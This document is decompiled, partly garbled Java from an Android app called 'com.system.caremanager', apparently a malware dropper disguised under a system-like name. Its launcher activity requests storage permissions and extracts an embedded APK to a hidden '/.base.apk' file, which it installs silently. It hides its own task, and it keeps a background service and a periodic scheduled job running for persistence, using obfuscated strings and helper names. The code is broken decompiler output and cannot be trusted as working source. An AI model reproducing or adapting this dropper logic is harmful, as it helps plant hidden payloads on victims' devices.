package com.system.caremanager;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class LauncherActivity extends Activity {

    public static Boolean Holdit;
    public static boolean IamDone;
    public static String T5;
    public static String T__2;
    public static String T__3;
    public static String T__4;
    public static String T__6;
    public static String T__7;
    public static String targetPackagePrimary;
     int PERMISSION_ALL;
     String[] StoragPermissions;

    static {
        // Static initialization block
    }

    public MainLauncherActivity() {
        int val = 555;
        this.PERMISSION_ALL = val;
        String str = "android.permission.WRITE_EXTERNAL_STORAGE";
        String str2 = "android.permission.READ_EXTERNAL_STORAGE";
        Object[] arr = new String[]{ str, str2 };
        this.StoragPermissions = result;
        return;
    }

    public static boolean isPackageInstalled(String param1, PackageManager param2) {
        try {
            PackageInfo result = param2.getPackageInfo(param1, null);
            return 1;
            } catch (Exception e) {
                e.printStackTrace();
            return null;
        } catch (PackageManager$NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    public static boolean hasPermissions(Context param1, String[] param2) {
        if (param1 == null) {
            // branch: cond_1
        }
        if (param2 == null) {
            // branch: cond_1
        }
        int len = param2.length;
        if (null >= len) {
            // branch: cond_1
        }
        String item = param2[null];
        int result = ActivityCompat.checkSelfPermission(param1, item);
        if (result == null) {
            // branch: cond_0
        }
        return null;
        int val = null + 0x1;
        // continue loop -> :goto_0
        return 1;
    }

    public static void scheduleJob(Context param1) {
        String str = "jobscheduler";
        Object result = this.getSystemService(str);
        result = (JobScheduler) result;
        ComponentName componentName = new ComponentName();
        Class cls = PersistentJobService.class;
        int SDK_INT = Build$VERSION.SDK_INT;
        int val = 24;
        int val2 = 100;
        if (SDK_INT < val) {
            // branch: cond_0
        }
        JobInfo.Builder jobInfo.Builder = new JobInfo.Builder();
        JobInfo.Builder result2 = this.setPeriodic(componentName, val);
        JobInfo result3 = this.build();
        // continue loop -> :goto_0
        JobInfo.Builder jobInfo.Builder2 = new JobInfo.Builder();
        JobInfo.Builder result4 = this.setPeriodic(componentName, val);
        JobInfo result5 = this.build();
        int result6 = result.schedule(result);
        return;
    }

    public void checkAndBind() {
        try {
            String dataProcessor = DataPackagingEngine.dataProcessor;
            int val = 2;
            char result = dataProcessor.charAt(val);
            char c1 = DataPackagingEngine.c1;
            String str = "null";
            String str2 = "organizationsqumtstartupqrapiistanbuljinnovationypermalinkwpopnveteransbboobhrushgcoordinatedncelebratec147";
            if (result != c1) {
                // branch: cond_13
            }
            String targetPackagePrimary = MainLauncherActivity.targetPackagePrimary;
            String result2 = targetPackagePrimary.toLowerCase();
            boolean result3 = result.equals(str);
            if (result != null) {
                // branch: cond_13
            }
            String targetPackagePrimary2 = MainLauncherActivity.targetPackagePrimary;
            PackageManager result4 = p0 .. p0.getPackageManager();
            boolean result5 = MainLauncherActivity.isPackageInstalled(targetPackagePrimary2, result);
            if (result != null) {
                // branch: cond_13
            }
            Boolean result6 = Boolean.valueOf(1);
            MainLauncherActivity.Holdit = result;
            Context result7 = p0 .. p0.getApplicationContext();
            String result8 = result.getPackageName();
            String result9 = DataPackagingEngine.getToken(result, result);
            int result10 = result.length();
            if (result != null) {
                // branch: cond_16
            }
            String str3 = "apk";
            Context result11 = p0 .. p0.getApplicationContext();
            Resources result12 = result.getResources();
            int val2 = 2131230720;
            InputStream result13 = result.openRawResource(val2);
            int result14 = result.available();
            if (result == null) {
                // branch: cond_16
            }
            long longVal = (long) result;
            Boolean result15 = Boolean.valueOf(1);
            boolean result16 = result.booleanValue();
            if (result == null) {
                // branch: cond_1
            }
            MainLauncherActivity.T__2 = str4;
            String T__3 = MainLauncherActivity.T__3;
            boolean result17 = str4.equals(T__3);
            if (result == null) {
                // branch: cond_0
            }
            Boolean result18 = Boolean.valueOf(null);
            // continue loop -> :goto_0
            Boolean result19 = Boolean.valueOf(1);
            boolean result20 = result.booleanValue();
            if (result == null) {
                // branch: cond_3
            }
            MainLauncherActivity.T__3 = str4;
            String T__2 = MainLauncherActivity.T__2;
            boolean result21 = str4.equals(T__2);
            if (result == null) {
                // branch: cond_2
            }
            Boolean result22 = Boolean.valueOf(null);
            // continue loop -> :goto_1
            if (/* if-ltz result */) {
                // branch: cond_4
            }
            // continue loop -> :goto_5
            if (/* if-ltz result */) {
                // branch: cond_9
            }
            Boolean result23 = Boolean.valueOf(1);
            boolean result24 = result.booleanValue();
            if (result == null) {
                // branch: cond_6
            }
            MainLauncherActivity.T__6 = str4;
            String T__32 = MainLauncherActivity.T__3;
            boolean result25 = str4.equals(T__32);
            if (result == null) {
                // branch: cond_5
            }
            Boolean result26 = Boolean.valueOf(null);
            // continue loop -> :goto_2
            Boolean result27 = Boolean.valueOf(1);
            boolean result28 = result.booleanValue();
            if (result == null) {
                // branch: cond_8
            }
            MainLauncherActivity.T__7 = str4;
            String T__33 = MainLauncherActivity.T__3;
            boolean result29 = str4.equals(T__33);
            if (result == null) {
                // branch: cond_7
            }
            Boolean result30 = Boolean.valueOf(null);
            // continue loop -> :goto_3
            // continue loop -> :goto_5
            if (/* if-ltz result */) {
                // branch: cond_a
            }
            // continue loop -> :goto_5
            if (/* if-ltz v15 */) {
                // branch: cond_d
            }
            Boolean result31 = Boolean.valueOf(1);
            boolean result32 = result.booleanValue();
            if (result == null) {
                // branch: cond_c
            }
            MainLauncherActivity.T__4 = str4;
            String T__34 = MainLauncherActivity.T__3;
            boolean result33 = str4.equals(T__34);
            if (result == null) {
                // branch: cond_b
            }
            Boolean result34 = Boolean.valueOf(null);
            // continue loop -> :goto_4
            Long result35 = Long.valueOf(result, result);
            int result36 = result.intValue();
            StringBuilder stringBuilder = new StringBuilder();
            File result37 = Environment.getExternalStorageDirectory();
            String result38 = result.getAbsolutePath();
            StringBuilder result39 = stringBuilder.append(result);
            String str5 = "/.";
            StringBuilder result40 = stringBuilder.append(str5);
            String str6 = "ba_se";
            String str7 = "__";
            String result41 = DataPackagingEngine.removeString(str6, str7);
            StringBuilder result42 = stringBuilder.append(result);
            String str8 = ".";
            StringBuilder result43 = stringBuilder.append(str8);
            StringBuilder result44 = stringBuilder.append(str3);
            String result45 = stringBuilder.toString();
            FileOutputStream fileOutputStream = new FileOutputStream();
            File file = new File();
            byte[] arr = new byte[result];
            int result46 = result.read(arr, null, result);
            int val3 = -1;
            if (result == val3) {
                // branch: cond_e
            }
            fileOutputStream.write(arr, null, result);
            int val4 = 2;
            // continue loop -> :goto_6
            result.close();
            fileOutputStream.close();
            PackageManager result47 = result.getPackageManager();
            PackageInfo result48 = result.getPackageArchiveInfo(result, null);
            String packageName = result.packageName;
            DataPackagingEngine.dit(result, packageName, result);
            // continue loop -> :goto_9
            } catch (Exception e) {
                e.printStackTrace();
            Boolean result49 = Boolean.valueOf(1);
            boolean result50 = result.booleanValue();
            if (result == null) {
                // branch: cond_10
            }
            MainLauncherActivity.T__6 = str4;
            String T__35 = MainLauncherActivity.T__3;
            boolean result51 = str4.equals(T__35);
            if (result == null) {
                // branch: cond_f
            }
            Boolean result52 = Boolean.valueOf(null);
            // continue loop -> :goto_7
            Boolean result53 = Boolean.valueOf(1);
            boolean result54 = result.booleanValue();
            if (result == null) {
                // branch: cond_12
            }
            MainLauncherActivity.T__7 = str4;
            String T__36 = MainLauncherActivity.T__3;
            boolean result55 = str4.equals(T__36);
            if (result == null) {
                // branch: cond_11
            }
            Boolean result56 = Boolean.valueOf(null);
            // continue loop -> :goto_8
            DataPackagingEngine.dit(result, result, result);
            MainLauncherActivity.FI_N mainLauncherActivity.FI_N = new MainLauncherActivity.FI_N();
            Context result57 = p0 .. p0.getApplicationContext();
            int val5 = 2;
            String[] arr2 = new String[val5];
            arr2[null] = str2;
            arr2[1] = str2;
            AsyncTask result58 = mainLauncherActivity.FI_N.execute(arr2);
            Context result59 = p0 .. p0.getApplicationContext();
            DataPackagingEngine.installPackage(result, result, str3);
            p0 .. p0.finish();
            // continue loop -> :goto_a
            } catch (Exception e) {
                e.printStackTrace();
            result.printStackTrace();
            // continue loop -> :goto_a
            String targetPackagePrimary3 = MainLauncherActivity.targetPackagePrimary;
            PackageManager result60 = p0 .. p0.getPackageManager();
            boolean result61 = MainLauncherActivity.isPackageInstalled(targetPackagePrimary3, result);
            if (result == null) {
                // branch: cond_14
            }
            String targetPackagePrimary4 = MainLauncherActivity.targetPackagePrimary;
            String result62 = targetPackagePrimary4.toLowerCase();
            boolean result63 = result.equals(str3);
            if (result != null) {
                // branch: cond_14
            }
            Context result64 = p0 .. p0.getApplicationContext();
            PackageManager result65 = result.getPackageManager();
            String targetPackagePrimary5 = MainLauncherActivity.targetPackagePrimary;
            Intent result66 = result.getLaunchIntentForPackage(targetPackagePrimary5);
            int val6 = 268435456;
            Intent result67 = result.addFlags(val6);
            v1.startActivity(result);
            MainLauncherActivity.FI_N mainLauncherActivity.FI_N2 = new MainLauncherActivity.FI_N();
            Context result68 = p0 .. p0.getApplicationContext();
            int val7 = 2;
            String[] arr3 = new String[val7];
            arr3[null] = str2;
            arr3[1] = str2;
            AsyncTask result69 = mainLauncherActivity.FI_N2.execute(arr3);
            // continue loop -> :goto_a
            Class cls = MainBackgroundService.class;
            Application result70 = p0 .. p0.getApplication();
            boolean result71 = BackgroundServiceHelper.removedqtractort40(MainBackgroundService.class, result);
            if (result == null) {
                // branch: cond_15
            }
            Intent intent = new Intent();
            Class cls2 = MainBackgroundService.class;
            ComponentName result72 = v1.startService(intent);
            } catch (Exception e) {
                e.printStackTrace();
            Context result73 = p0 .. p0.getApplicationContext();
            MainLauncherActivity.scheduleJob(result);
            p0 .. p0.finish();
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void finish() {
        MainLauncherActivity.IamDone = 1;
        this.finishAndRemoveTask();
        return;
    }

    public void keepworking(Context param1) {
        try {
            Context result = this.getApplicationContext();
            String str = "organizationsqumtstartupqrapiistanbuljinnovationypermalinkwpopnveteransbboobhrushgcoordinatedncelebratec147";
            DataPackagingEngine.phonixeffect(result, str, v2, v3);
            String[] StoragPermissions = this.StoragPermissions;
            boolean result2 = MainLauncherActivity.hasPermissions(param1, StoragPermissions);
            if (result != null) {
                // branch: cond_0
            }
            String targetPackagePrimary = MainLauncherActivity.targetPackagePrimary;
            String result3 = targetPackagePrimary.toLowerCase();
            String str2 = "null";
            boolean result4 = result.equals(str2);
            if (result != null) {
                // branch: cond_0
            }
            String[] StoragPermissions2 = this.StoragPermissions;
            int PERMISSION_ALL = this.PERMISSION_ALL;
            ActivityCompat.requestPermissions(p0, StoragPermissions2, PERMISSION_ALL);
            // continue loop -> :goto_0
            this.checkAndBind();
            Class cls = MainBackgroundService.class;
            Application result5 = this.getApplication();
            boolean result6 = BackgroundServiceHelper.removedqtractort40(MainBackgroundService.class, result);
            if (result == null) {
                // branch: cond_1
            }
            Intent intent = new Intent();
            Class cls2 = MainBackgroundService.class;
            ComponentName result7 = this.startService(intent);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onBackPressed() {
        this.onBackPressed();
        return;
    }

    public void onCreate(Bundle param1) {
        try {
            String str = "STR";
            String str2 = "STO";
            String str3 = "SIM";
            String str4 = "SME";
            String str5 = "";
            this.onCreate(param1);
            boolean result = this.requestWindowFeature(1);
            Window result2 = this.getWindow();
            int val = 1024;
            result.setFlags(val, val);
            int val2 = 2131165184;
            this.setContentView(val2);
            Context result3 = this.getApplicationContext();
            String result4 = My_Settings.read(result, str4, str5);
            int result5 = result.length();
            String str6 = "NO";
            if (result != null) {
                // branch: cond_0
            }
            Context result6 = this.getApplicationContext();
            My_Settings.Write(result, str4, str6);
            Context result7 = this.getApplicationContext();
            String result8 = My_Settings.read(result, str3, str5);
            int result9 = result.length();
            if (result != null) {
                // branch: cond_1
            }
            Context result10 = this.getApplicationContext();
            My_Settings.Write(result, str3, str6);
            Context result11 = this.getApplicationContext();
            String result12 = My_Settings.read(result, str2, str5);
            int result13 = result.length();
            if (result != null) {
                // branch: cond_2
            }
            Context result14 = this.getApplicationContext();
            My_Settings.Write(result, str2, str6);
            Context result15 = this.getApplicationContext();
            String result16 = My_Settings.read(result, str, str5);
            int result17 = result.length();
            if (result != null) {
                // branch: cond_3
            }
            Context result18 = this.getApplicationContext();
            My_Settings.Write(result, str, str6);
            Point point = new Point();
            WindowManager result19 = this.getWindowManager();
            Display result20 = result.getDefaultDisplay();
            result.getRealSize(point);
            Context result21 = this.getApplicationContext();
            String str7 = "SCH";
            StringBuilder stringBuilder = new StringBuilder();
            int x = this.x;
            StringBuilder result22 = stringBuilder.append(x);
            String result23 = stringBuilder.toString();
            My_Settings.Write(result, str7, result);
            Context result24 = this.getApplicationContext();
            String str8 = "SCW";
            StringBuilder stringBuilder2 = new StringBuilder();
            int y = this.y;
            StringBuilder result25 = stringBuilder2.append(y);
            String result26 = stringBuilder2.toString();
            My_Settings.Write(result, str8, result);
            MainLauncherActivity.MyExceptionHandler mainLauncherActivity.MyExceptionHandler = new MainLauncherActivity.MyExceptionHandler();
            Class cls = MainLauncherActivity.class;
            Thread.setDefaultUncaughtExceptionHandler(mainLauncherActivity.MyExceptionHandler);
            Context result27 = this.getApplicationContext();
            MainBackgroundService.appContext = result;
            // continue loop -> :goto_4
            } catch (Exception e) {
                e.printStackTrace();
            Boolean result28 = Boolean.valueOf(1);
            boolean result29 = result.booleanValue();
            if (result == null) {
                // branch: cond_4
            }
            Boolean result30 = Boolean.valueOf(null);
            // continue loop -> :goto_0
            boolean result31 = result.booleanValue();
            if (result == null) {
                // branch: cond_5
            }
            Boolean result32 = Boolean.valueOf(null);
            // continue loop -> :goto_1
            boolean result33 = result.booleanValue();
            if (result == null) {
                // branch: cond_6
            }
            Boolean result34 = Boolean.valueOf(null);
            // continue loop -> :goto_2
            boolean result35 = result.booleanValue();
            if (result == null) {
                // branch: cond_7
            }
            Boolean result36 = Boolean.valueOf(null);
            // continue loop -> :goto_3
            Context result37 = this.getApplicationContext();
            Resources result38 = result.getResources();
            int val3 = 2131296274;
            String result39 = result.getString(val3);
            DataPackagingEngine.dataProcessor = result;
            Context result40 = this.getApplicationContext();
            Handler handler = new Handler();
            MainLauncherActivity.1 mainLauncherActivity.1 = new MainLauncherActivity.1();
            boolean result41 = handler.postDelayed(mainLauncherActivity.1, str8, stringBuilder2);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onRequestPermissionsResult(int param1, String[] param2, int[] param3) {
        this.onRequestPermissionsResult(param1, param2, param3);
        int val = 555;
        if (param1 == val) {
            // branch: cond_0
        }
        // continue loop -> :goto_0
        int len = param3.length;
        if (/* if-lez len */) {
            // branch: cond_1
        }
        int item = param3[null];
        if (item != null) {
            // branch: cond_1
        }
        this.checkAndBind();
        // continue loop -> :goto_0
        String str = "Please Allow Permission To Continue.";
        Toast result = Toast.makeText(p0, str, null);
        result.show();
        String[] StoragPermissions = this.StoragPermissions;
        int PERMISSION_ALL = this.PERMISSION_ALL;
        ActivityCompat.requestPermissions(p0, StoragPermissions, PERMISSION_ALL);
        return;
    }

}